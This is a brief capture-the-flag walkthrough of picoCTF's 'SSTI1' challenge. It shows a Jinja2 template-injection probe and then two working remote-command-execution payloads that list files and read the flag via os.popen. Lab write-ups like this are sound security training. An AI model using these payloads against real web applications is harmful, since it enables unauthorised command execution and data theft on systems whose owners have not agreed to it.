# SSTI1
https://play.picoctf.org/practice/challenge/492

> I made a cool website where you can announce whatever you want! Try it out!

## Steps

1. Based on challenge name, try SSTI checks with the classic `{{ 7*7 }}` Jinja check, and it returns 49
![alt text](<images/Screenshot 2025-09-10 125204.png>)
![alt text](<images/Screenshot 2025-09-10 125211.png>)

2. Use payloads from https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/#jinja2-remote-command-execution to try remote code execution with `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -a').read() }}`
![alt text](<images/Screenshot 2025-09-10 125410.png>)
![alt text](<images/Screenshot 2025-09-10 125415.png>)

3. Read the flag file with `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}`
![alt text](<images/Screenshot 2025-09-10 125423.png>)
![alt text](<images/Screenshot 2025-09-10 125431.png>)